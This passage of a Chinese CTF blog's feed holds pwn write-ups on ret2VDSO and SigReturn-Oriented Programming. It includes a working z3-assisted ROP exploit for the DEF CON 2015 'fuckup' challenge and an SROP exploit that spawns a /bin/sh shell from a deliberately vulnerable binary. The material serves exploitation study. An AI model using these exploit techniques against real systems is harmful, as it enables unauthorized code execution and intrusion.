class="line">AUX_VEC_ENTRIES = dict(AUX_VEC_ENTRIES[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(AUX_VEC_ENTRIES), <span class="number">2</span>))</span><br><span class="line">vdso_addr = AUX_VEC_ENTRIES[AT_SYSINFO_EHDR]</span><br><span class="line">info(<span class="string">"vdso_addr = "</span> + hex(vdso_addr))</span><br><span class="line">bin_sh_addr = AUX_VEC_ENTRIES[AT_RANDOM] - <span class="number">0x379</span> <span class="comment"># 获取“/bin/sh”地址</span></span><br><span class="line">info(<span class="string">"bin_sh_addr = "</span> + hex(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">syscall_ret = <span class="number">0xffffffffff600007</span></span><br><span class="line">syscall_ret = <span class="number">0x4000b8</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = bin_sh_addr</span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">8</span> + p64(set_sigreturn) + p64(syscall_ret) + str(frame)</span><br><span class="line">raw_input(<span class="string">'@'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="fuckup"><a href="#fuckup" class="headerlink" title="fuckup"></a>fuckup</h1><p>2015 Defcon Quals 中这道题可以使用 ret2VDSO 和 SROP。具体没能复现出来，主要理解一下思想。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./fuckup</span><br><span class="line">[*] <span class="string">'/home/beale/Desktop/2015-Defcon-Quals-fuckup/fuckup'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>总共有五个选项，选项 2 会修改程序段和栈的基址，并重新指向新的地址；选项 3 会告诉我们当前的随机数并再次随机化程序段；选项 4 中可以进行溢出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./fuckup</span><br><span class="line">Welcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.</span><br><span class="line">This app is to <span class="built_in">help</span> prove the benefits of F.U.C.K.U.P.</span><br><span class="line">Main Menu</span><br><span class="line">---------</span><br><span class="line">1. Display info</span><br><span class="line">2. Change random</span><br><span class="line">3. View state info</span><br><span class="line">4. Test stack smash</span><br><span class="line">-------</span><br><span class="line">0. Quit</span><br></pre></td></tr></table></figure><p>在选项 2 的代码反编译后可以看到，每次用户执行命令时，程序会根据类似于 WELL512 的生成算法生成的随机数，改变二进制映射的存储器的基址：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80481A6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    seed_1 = WELL512() * <span class="number">4294967295.0</span>;</span><br><span class="line">    seed_2 = (<span class="keyword">signed</span> __int64)seed_1;</span><br><span class="line">    addy = (<span class="keyword">void</span> *)(seed_2 &amp; <span class="number">0xFFFFF000</span>);</span><br><span class="line">    actual = my_mmap(seed_2 &amp; <span class="number">0xFFFFF000</span>, <span class="number">28672</span>, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0</span>, v0, v0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (seed_2 &amp; <span class="number">0xFFFFF000</span>) != actual );</span><br><span class="line">  qmemcpy(addy, dword_804EB40, <span class="number">0x7000</span>u);</span><br><span class="line">  my_mprotect(addy, <span class="number">0x4000</span>u, <span class="number">5</span>);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>普通的思路肯定是做不了的。使用 VDSO 的思路大致如下：</p><ul><li>因为 32 位下 VDSO 只有 1 字节是随机的，可以暴力破解</li><li>直接溢出改返回地址，但只有 100 个字节<ul><li>首先先利用 VDSO 的 Gadget 做出 sys_read 并加大输入的大小</li><li>将读入的内容放到 TLS（TLS 的位置在 VDSO 前一页）</li><li>使用 sysenter 将栈转移到 TLS 段</li><li>在第二次输入的时候将 /bin/sh 放到 TLS 段（这个时候栈已经搬到 TLS 了）</li></ul></li><li>接着把 Sigreturn Gadget 以及 Fake Signal Frame 一并放进，然后可以直接 execve 执行 /bin/sh</li><li>循环直到成功 get shell</li></ul><p>还可以通过 z3 对伪随机数进行预测，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">state = [BitVec(<span class="string">"a1_&#123;0&#125;"</span>.format(i), <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(x + offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">well512</span><span class="params">(index)</span>:</span></span><br><span class="line">    idx = (index+<span class="number">15</span>) &amp; <span class="number">15</span></span><br><span class="line">    a = state[index]</span><br><span class="line">    c = state[(index+<span class="number">13</span>) &amp; <span class="number">15</span>]</span><br><span class="line">    b = a ^ c ^ ((a &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0xffffffff</span>) ^ ((c &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    c = state[(index+<span class="number">9</span>) &amp; <span class="number">15</span>]</span><br><span class="line">    c ^= (c &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    state[(index+<span class="number">10</span>) &amp; <span class="number">15</span>] = c ^ b</span><br><span class="line">    a = state[idx]</span><br><span class="line">    d = ((<span class="number">32</span> * (c ^ b)) &amp; <span class="number">0xDA442D24</span>) ^ c ^ b</span><br><span class="line">    state[idx] = a ^ b ^ d ^ ((a &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xffffffff</span>) ^ (</span><br><span class="line">        (b &lt;&lt; <span class="number">18</span>) &amp; <span class="number">0xffffffff</span>) ^ ((c &lt;&lt; <span class="number">28</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">well512_z3</span><span class="params">(index)</span>:</span></span><br><span class="line">    idx = (index+<span class="number">15</span>) &amp; <span class="number">15</span></span><br><span class="line">    a = state[index]</span><br><span class="line">    c = state[(index+<span class="number">13</span>) &amp; <span class="number">15</span>]</span><br><span class="line">    b = a ^ c ^ (a &lt;&lt; <span class="number">16</span>) ^ (c &lt;&lt; <span class="number">15</span>)</span><br><span class="line">    c = state[(index+<span class="number">9</span>) &amp; <span class="number">15</span>]</span><br><span class="line">    c ^= LShR(c, <span class="number">11</span>)</span><br><span class="line">    a = state[idx]</span><br><span class="line">    state[(index+<span class="number">10</span>) &amp; <span class="number">15</span>] = b ^ c</span><br><span class="line">    d = ((<span class="number">32</span> * (c ^ b)) &amp; <span class="number">0xDA442D24</span>) ^ c ^ b</span><br><span class="line">    a = state[idx]</span><br><span class="line">    state[idx] = a ^ b ^ d ^ (a &lt;&lt; <span class="number">2</span>) ^ (b &lt;&lt; <span class="number">18</span>) ^ (c &lt;&lt; <span class="number">28</span>)</span><br><span class="line">    <span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_state</span><span class="params">(recv)</span>:</span></span><br><span class="line">    info(<span class="string">'Start find state.'</span>)</span><br><span class="line">    <span class="keyword">global</span> state</span><br><span class="line">    z = Solver()</span><br><span class="line">    idx = <span class="number">15</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> recv:</span><br><span class="line">        idx = well512_z3(idx)</span><br><span class="line">        z.add(state[idx] == r + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./fuckup'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(c)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Quit\n'</span>)</span><br><span class="line">    p.sendline(str(c))</span><br><span class="line"></span><br><span class="line">r_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r = int(p.recv(<span class="number">0x20</span>)[<span class="number">0x11</span>:<span class="number">0x19</span>], <span class="number">16</span>)</span><br><span class="line">    r_list.append(r)</span><br><span class="line">info(r_list)</span><br><span class="line">z = find_state(r_list)</span><br><span class="line">info(<span class="string">'Solver result =&gt; '</span> + str(z.check()))</span><br><span class="line">next_state = dict()</span><br><span class="line">model = z.model()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> model:</span><br><span class="line">    idx = int(str(i)[<span class="number">3</span>:])</span><br><span class="line">    val = model[i].as_long()</span><br><span class="line">    next_state[idx] = val</span><br><span class="line">info(next_state)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> next_state:</span><br><span class="line">        state[i] = next_state[i]</span><br><span class="line">idx = <span class="number">15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">    idx = well512(idx)</span><br><span class="line">idx = well512(idx)</span><br><span class="line">predict_val = state[idx] - <span class="number">1</span></span><br><span class="line">info(<span class="string">'predict_val = '</span> + hex(predict_val))</span><br><span class="line">current_base = <span class="number">0xfffff000</span> &amp; predict_val</span><br><span class="line">info(<span class="string">'current_base = '</span> + hex(current_base))</span><br><span class="line"></span><br><span class="line">base = <span class="number">0x8048000</span></span><br><span class="line">offset = current_base - base</span><br><span class="line"><span class="comment"># 0x0804908f : pop eax ; pop ebx ; pop esi ; ret</span></span><br><span class="line">pop_eax_ebx_esi_ret = <span class="number">0x0804908f</span></span><br><span class="line"><span class="comment"># 0x0804961a : pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0804961a</span></span><br><span class="line"><span class="comment"># 0x0804875f : int 0x80</span></span><br><span class="line">int_0x80 = <span class="number">0x0804875f</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x16</span></span><br><span class="line">payload += m(pop_eax_ebx_esi_ret)</span><br><span class="line">payload += p32(<span class="number">0x7D</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += m(pop_edx_ecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0x7</span>)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(current_base)</span><br><span class="line">payload += m(int_0x80)</span><br><span class="line">payload += m(pop_eax_ebx_esi_ret)</span><br><span class="line">payload += p32(<span class="number">0x3</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += m(pop_edx_ecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">payload += p32(current_base)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += m(int_0x80)</span><br><span class="line">payload += p32(current_base)</span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += asm(shellcraft.sh())</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso</a><br><a href="http://adam8157.info/blog/2011/10/linux-vdso/" target="_blank" rel="noopener">http://adam8157.info/blog/2011/10/linux-vdso/</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="https://www.anquanke.com/post/id/85810" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85810</a><br><a href="https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/" target="_blank" rel="noopener">https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/</a><br><a href="https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html" target="_blank" rel="noopener">https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html</a><br><a href="https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/" target="_blank" rel="noopener">https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/</a><br><a href="https://pwnexpoit.tistory.com/13" target="_blank" rel="noopener">https://pwnexpoit.tistory.com/13</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用 SROP 的时候，一般情况下很难找得到 &lt;code&gt;syscall ; ret&lt;/code&gt;，这时就需要在 VDSO 中找了。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf，pwn" scheme="blog.b3ale.cn/tags/ctf%EF%BC%8Cpwn/"/>
    
  </entry>
  
  <entry>
    <title>Understanding SigReturn-Oriented-Programming</title>
    <link href="blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/"/>
    <id>blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/</id>
    <published>2020-03-13T08:07:27.000Z</published>
    <updated>2020-03-14T03:17:29.492Z</updated>
    
    <content type="html"><![CDATA[<p>去年学 ROP 的时候遗漏的一个技术。</p><a id="more"></a><h1 id="What-is-SROP"><a href="#What-is-SROP" class="headerlink" title="What is SROP"></a>What is SROP</h1><p>SROP（Sigreturn Oriented Programming）于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究 Framing Signals — A Return to Portable Shellcode 发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。</p><p>其中，Sigreturn 是一个系统调用，在类 Unix 系统发生 Signal 的时候会被间接地调用。</p><h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal 机制是类 Unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/1.png" alt="Linux下的Signal信号机制"></p><ol><li>首先内核向某个用户态进程发送 Signal 时，该进程会被暂时挂起并进入内核态；</li><li>内核会为该进程保存上下文（类似于保存函数现场，将所有寄存器压入栈，以及压入 Signal 的信息和指向 Sigreturn 的系统调用地址），存储完毕后，回到用户态；</li><li>接着使用用户态中注册过的 Signal Handler 处理相应的 Signal；</li><li>处理完毕后回到内核态，内核执行 Sigreturn 系统调用（32 位的调用号为 77，64 位的调用号为 15），将对应进程的上下文恢复，最后回到用户态。</li></ol><p>在保存进程上下文的时候，用户态的栈中的结构如下。其中 ucontext 以及 siginfo 这一段被称为 Signal Frame，在 Signal Handler 执行完之后，就会执行 Sigreturn 代码：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/2.png" alt="在内核中保存进程上下文之后栈的结构"></p><p>Signal Frame 在不同架构下不同。在 x86 中的 sigcontext 结构体如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span> &#123;</span></span><br><span class="line">__u16gs, __gsh;</span><br><span class="line">__u16fs, __fsh;</span><br><span class="line">__u16es, __esh;</span><br><span class="line">__u16ds, __dsh;</span><br><span class="line">__u32edi;</span><br><span class="line">__u32esi;</span><br><span class="line">__u32ebp;</span><br><span class="line">__u32esp;</span><br><span class="line">__u32ebx;</span><br><span class="line">__u32edx;</span><br><span class="line">__u32ecx;</span><br><span class="line">__u32eax;</span><br><span class="line">__u32trapno;</span><br><span class="line">__u32err;</span><br><span class="line">__u32eip;</span><br><span class="line">__u16cs, __csh;</span><br><span class="line">__u32eflags;</span><br><span class="line">__u32esp_at_signal;</span><br><span class="line">__u16ss, __ssh;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> __<span class="title">user</span>*<span class="title">fpstate</span>;</span> <span class="comment">// FPU寄存器状态</span></span><br><span class="line">__u32oldmask;</span><br><span class="line">__u32cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 x64 中的 sigcontext 结构体如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span> &#123;</span></span><br><span class="line">__u64r8;</span><br><span class="line">__u64r9;</span><br><span class="line">__u64r10;</span><br><span class="line">__u64r11;</span><br><span class="line">__u64r12;</span><br><span class="line">__u64r13;</span><br><span class="line">__u64r14;</span><br><span class="line">__u64r15;</span><br><span class="line">__u64rdi;</span><br><span class="line">__u64rsi;</span><br><span class="line">__u64rbp;</span><br><span class="line">__u64rbx;</span><br><span class="line">__u64rdx;</span><br><span class="line">__u64rax;</span><br><span class="line">__u64rcx;</span><br><span class="line">__u64rsp;</span><br><span class="line">__u64rip;</span><br><span class="line">__u64eflags;<span class="comment">/* RFLAGS */</span></span><br><span class="line">__u16cs;</span><br><span class="line">__u16gs;</span><br><span class="line">__u16fs;</span><br><span class="line">__u16__pad0;</span><br><span class="line">__u64err;</span><br><span class="line">__u64trapno;</span><br><span class="line">__u64oldmask;</span><br><span class="line">__u64cr2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> __<span class="title">user</span>*<span class="title">fpstate</span>;</span><span class="comment">/* Zero when no FPU context */</span></span><br><span class="line">__u64reserved1[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="SROP-Theory"><a href="#SROP-Theory" class="headerlink" title="SROP Theory"></a>SROP Theory</h2><p>在 Signal 机制的整个过程中，内核所做的主要工作就是为进程保存上下文以及恢复上下文。所改变的 Signal Frame 是处在用户的地址空间中的，所以可以得出一下结论：</p><ul><li>Signal Frame 可以被用户读写；</li><li>因为内核没有直接参与 Signal，所以内核并不知道保存的 Signal Frame 是否是真正的进程上下文（即执行 Sigreturn 的时候）。</li></ul><p>那么就可以构造出假的 Signal Frame，提前把 RDI、RSI、RIP 等寄存器的值放在构造的结构体中，执行完 Sigreturn 后就会给各个寄存器设置好值。构造 SROP 的条件如下：</p><ul><li>可以通过栈溢出来控制栈</li><li>需要知道一些地址<ul><li><code>&amp;&quot;/bin/sh&quot;</code></li><li>Signal Frame</li><li>Gadget：<code>syscall ; ret</code></li><li>Sigreturn</li></ul></li><li>需要有足够大的空间来放下 Signal Frame</li></ul><p>在 pwntools 中也集成了 SROP 的工具，即 <code>SigreturnFrame()</code>，用于构造假的 sigcontext 结构体（Signal Frame）。</p><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>我们可以自行构造一个程序，使用 SROP 进行一个简单的利用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="comment">// 读取 0x200 字节</span></span><br><span class="line">        <span class="string">"mov rax, 0\n"</span> <span class="comment">// sys_read</span></span><br><span class="line">        <span class="string">"mov rdi, 0\n"</span> <span class="comment">// fd</span></span><br><span class="line">        <span class="string">"lea rsi, %0\n"</span> <span class="comment">// buf</span></span><br><span class="line">        <span class="string">"mov rdx, 0x200\n"</span> <span class="comment">// count</span></span><br><span class="line">        <span class="string">"syscall\n"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 恢复进程上下文</span></span><br><span class="line">        <span class="string">"mov rax, 15\n"</span> <span class="comment">// sys_rt_sigaction</span></span><br><span class="line">        <span class="string">"mov rdi, 0\n"</span></span><br><span class="line">        <span class="string">"mov rsp, rsi\n"</span> <span class="comment">// 把buf作为栈</span></span><br><span class="line">        <span class="comment">// syscall 的 symbol，便于查找</span></span><br><span class="line">        <span class="string">"syscall:\n"</span></span><br><span class="line">        <span class="string">"syscall\n"</span></span><br><span class="line">        <span class="string">"jmp exit\n"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 退出程序</span></span><br><span class="line">        <span class="string">"exit:\n"</span></span><br><span class="line">        <span class="string">"mov rax, 60\n"</span> <span class="comment">// sys_exit</span></span><br><span class="line">        <span class="string">"mov rdi, 0\n"</span></span><br><span class="line">        <span class="string">"syscall\n"</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">"m"</span> (buf)</span><br><span class="line">        :</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造出 Signal Frame，并在 buf 上设置好字符串，发送 payload 后拿到 shell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造假的Signal Frame</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve <span class="comment"># 设置系统调用号为sys_execve</span></span><br><span class="line">frame.rdi = elf.symbols[<span class="string">'buf'</span>] + <span class="number">0x100</span> <span class="comment"># 设置第一个参数为偏移0x100处的“/bin/sh”字符串</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = elf.symbols[<span class="string">'syscall'</span>]</span><br><span class="line"></span><br><span class="line">payload = str(frame).ljust(<span class="number">0x100</span>, <span class="string">'A'</span>) + <span class="string">'/bin/sh\x00'</span> <span class="comment"># 设置payload</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span 